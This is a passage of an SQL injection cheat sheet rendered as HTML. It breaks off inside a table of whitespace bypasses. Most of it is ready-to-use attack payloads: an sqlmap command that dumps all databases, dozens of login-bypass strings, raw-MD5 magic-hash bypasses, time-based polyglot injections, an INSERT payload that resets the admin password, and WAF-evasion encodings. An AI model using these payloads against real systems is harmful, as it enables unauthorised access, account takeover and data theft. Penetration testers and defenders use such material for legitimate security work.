  <a class="anchor" href="#sqlmap-without-sql-injection">#</a>
</h3>
<p>You can use SQLmap to access a database via its port instead of a URL.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap.py -d <span style="color:#e6db74">&#34;mysql://user:pass@ip/database&#34;</span> --dump-all 
</span></span></code></pre></div><h2 id="authentication-bypass">
  Authentication bypass
  <a class="anchor" href="#authentication-bypass">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;-&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&amp;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;^&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;*&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or 1=1 limit 1 -- -+
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;or&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;-&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39; &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;&amp;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;^&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;*&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;-||0&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">-||</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">-</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;--&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#75715e">--&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39;--&#39;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;--&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;-&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34; &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;&amp;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;^&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;*&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">or</span> <span style="color:#66d9ef">true</span><span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34; or true--
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or true--
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">true</span><span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39;) or true--
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">or</span> (<span style="color:#e6db74">&#39;x&#39;</span>)<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span>)) <span style="color:#66d9ef">or</span> ((<span style="color:#e6db74">&#39;x&#39;</span>))<span style="color:#f92672">=</span>((<span style="color:#e6db74">&#39;x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;x&#34;=&#34;x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;) or (&#34;x&#34;)=(&#34;x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;)) or ((&#34;x&#34;))=((&#34;x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 2 like 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1--
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1/*
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; -- -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#f92672">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;/*
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#ae81ff">2</span><span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; or 2 LIKE 2#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;) or 2 LIKE 2--
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span>) <span style="color:#66d9ef">or</span> (<span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span>) <span style="color:#66d9ef">or</span> (<span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;2&#39;</span><span style="color:#f92672">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;) or (&#39;</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39; LIKE &#39;</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39;/*
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; or &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;or 1=1 or &#39;&#39;=&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1&#39;--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1&#39;#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1&#39;--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1&#39;#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1&#39;/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; --
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;;-- azer 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; #
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1&#34;--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1&#34;#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1&#34;/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;or 1=1 or &#34;&#34;=&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1&#34;--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1&#34;#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1&#34;/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1&#34;--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1&#34;#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1&#34;/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">1234 &#34; AND 1=0 UNION ALL SELECT &#34;admin&#34;, &#34;81dc9bdb52d04dc20036dbd8313ed055
</span></span></span></code></pre></div><h2 id="authentication-bypass-raw-md5-sha1">
  Authentication Bypass (Raw MD5 SHA1)
  <a class="anchor" href="#authentication-bypass-raw-md5-sha1">#</a>
</h2>
<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;SELECT * FROM admin WHERE pass = &#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($password,<span style="color:#66d9ef">true</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;&#34;</span>
</span></span></code></pre></div><p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>' or 'SOMETHING</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;ffifdyop&#34;</span>, <span style="color:#66d9ef">true</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;or&#39;</span><span style="color:#ae81ff">6</span><span style="color:#a6e22e">�</span>]<span style="color:#a6e22e">��</span><span style="color:#f92672">!</span><span style="color:#a6e22e">r</span>,<span style="color:#a6e22e">��b</span><span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sha1</span>(<span style="color:#e6db74">&#34;3fDf &#34;</span>, <span style="color:#66d9ef">true</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">Q�u</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#a6e22e">�</span><span style="color:#f92672">@</span><span style="color:#a6e22e">�</span>[<span style="color:#a6e22e">�t�</span><span style="color:#f92672">-</span> <span style="color:#a6e22e">o��_</span><span style="color:#f92672">-!</span>
</span></span></code></pre></div><p>Challenge demo available at <a href="http://web.jarvisoj.com:32772">http://web.jarvisoj.com:32772</a></p>
<h2 id="polyglot-injection-multicontext">
  Polyglot injection (multicontext)
  <a class="anchor" href="#polyglot-injection-multicontext">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>SLEEP(<span style="color:#ae81ff">1</span>) <span style="color:#75715e">/*&#39; or SLEEP(1) or &#39;&#34; or SLEEP(1) or &#34;*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* MySQL only */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(SUBSTR(<span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">5</span>,BENCHMARK(<span style="color:#ae81ff">2000000</span>,SHA1(<span style="color:#ae81ff">0</span>xDE7EC71F1)),SLEEP(<span style="color:#ae81ff">1</span>))<span style="color:#75715e">/*&#39;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#39;|&#34;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#34;*/</span>
</span></span></code></pre></div><h2 id="routed-injection">
  Routed injection
  <a class="anchor" href="#routed-injection">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; AND 1=0 UNION ALL SELECT &#39;</span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">81</span>dc9bdb52d04dc20036dbd8313ed055<span style="color:#e6db74">&#39;
</span></span></span></code></pre></div><h2 id="insert-statement---on-duplicate-key-update">
  Insert Statement - ON DUPLICATE KEY UPDATE
  <a class="anchor" href="#insert-statement---on-duplicate-key-update">#</a>
</h2>
<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Inject <span style="color:#66d9ef">using</span> payload:
</span></span><span style="display:flex;"><span>  attacker_dummy<span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;), (&#34;</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;) ON DUPLICATE KEY UPDATE password=&#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34; --
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The query would look like this:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">INSERT INTO users (email, password) VALUES (&#34;</span>attacker_dummy<span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;), (&#34;</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;) ON DUPLICATE KEY UPDATE password=&#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34; -- &#34;</span>, <span style="color:#e6db74">&#34;bcrypt_hash_of_your_password_input&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>This query will <span style="color:#66d9ef">insert</span> a <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">for</span> the <span style="color:#66d9ef">user</span> <span style="color:#960050;background-color:#1e0010">“</span>attacker_dummy<span style="color:#f92672">@</span>example.com<span style="color:#960050;background-color:#1e0010">”</span>. It will also <span style="color:#66d9ef">insert</span> a <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">for</span> the <span style="color:#66d9ef">user</span> <span style="color:#960050;background-color:#1e0010">“</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#960050;background-color:#1e0010">”</span>.
</span></span><span style="display:flex;"><span>Because this <span style="color:#66d9ef">row</span> already <span style="color:#66d9ef">exists</span>, the <span style="color:#66d9ef">ON</span> DUPLICATE <span style="color:#66d9ef">KEY</span> <span style="color:#66d9ef">UPDATE</span> keyword tells MySQL <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">update</span> the <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span> <span style="color:#66d9ef">column</span> <span style="color:#66d9ef">of</span> the already <span style="color:#66d9ef">existing</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">to</span> <span style="color:#e6db74">&#34;bcrypt_hash_of_qwerty&#34;</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">After</span> this, we can simply authenticate <span style="color:#66d9ef">with</span> <span style="color:#960050;background-color:#1e0010">“</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#960050;background-color:#1e0010">”</span> <span style="color:#66d9ef">and</span> the password <span style="color:#960050;background-color:#1e0010">“</span>qwerty<span style="color:#960050;background-color:#1e0010">”</span><span style="color:#f92672">!</span>
</span></span></code></pre></div><h2 id="waf-bypass">
  WAF Bypass
  <a class="anchor" href="#waf-bypass">#</a>
</h2>
<h3 id="white-spaces-alternatives">
  White spaces alternatives
  <a class="anchor" href="#white-spaces-alternatives">#</a>
</h3>
<p>No Space (%20) - bypass using whitespace alternatives</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#66d9ef">and</span><span style="color:#f92672">%</span><span style="color:#ae81ff">091</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Dand<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>D1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>D<span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Cand<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>C1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span><span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Band<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>B1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>B<span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Aand<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#75715e">--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span>A0and<span style="color:#f92672">%</span>A01<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span>A0<span style="color:#75715e">--
</span></span></span></code></pre></div><p>No Whitespace - bypass using comments</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#75715e">/*comment*/</span><span style="color:#66d9ef">and</span><span style="color:#75715e">/**/</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#75715e">/**/</span><span style="color:#75715e">--
</span></span></span></code></pre></div><p>No Whitespace - bypass using parenthesis</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span>(<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">and</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">--
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Whitespace alternatives <span style="color:#66d9ef">by</span> DBMS
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> DBMS <span style="color:#f92672">|</span> ASCII characters <span style="color:#66d9ef">in</span> hexadicimal <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#75715e">---- | ------------------------------- |
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> SQLite3 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MySQL	<span style="color:#ae81ff">5</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>B, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">0</span>D, A0, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MySQL	<span style="color:#ae81ff">3</span>	<span style="color:#f92672">|</span> <span style="color:#ae81ff">01</span>, <span style="color:#ae81ff">02</span>, <span style="color:#ae81ff">03</span>, <span style="color:#ae81ff">04</span>, <span style="color:#ae81ff">05</span>, <span style="color:#ae81ff">06</span>, <span style="color:#ae81ff">07</span>, <span style="color:#ae81ff">08</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>B, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span>E, <span style="color:#ae81ff">0</span>F, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">1</span>A, <span style="color:#ae81ff">1</span>B, <span style="color:#ae81ff">1</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">1</span>D, <span style="color:#ae81ff">1</span>E, <span style="color:#ae81ff">1</span>F, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">7</span>F, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">8</span>D, <span style="color:#ae81ff">8</span>F, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">9</span>D, A0 <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> PostgreSQL <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Oracle <span style="color:#ae81ff">11</span><span style="color:#66d9ef">g</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">00</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MSSQL <span style="color:#f92672">|</span> <span style="color:#ae81ff">01</span>, <span style="color:#ae81ff">02</span>, <span style="color:#ae81ff">03</span>, <span style="color:#ae81ff">04</span>, <span style="color:#ae81ff">05</span>, <span style="color:#ae81ff">06</span>, <span style="color:#ae81ff">07</span>, <span style="color:#ae81ff">08</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>B, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span>E, <span style="color:#ae81ff">0</span>F, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">1</span>A, <span style="color:#ae81ff">1</span>B, <span style="color:#ae81ff">1</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">1</span>D, <span style="color:#ae81ff">1</span>E, <span 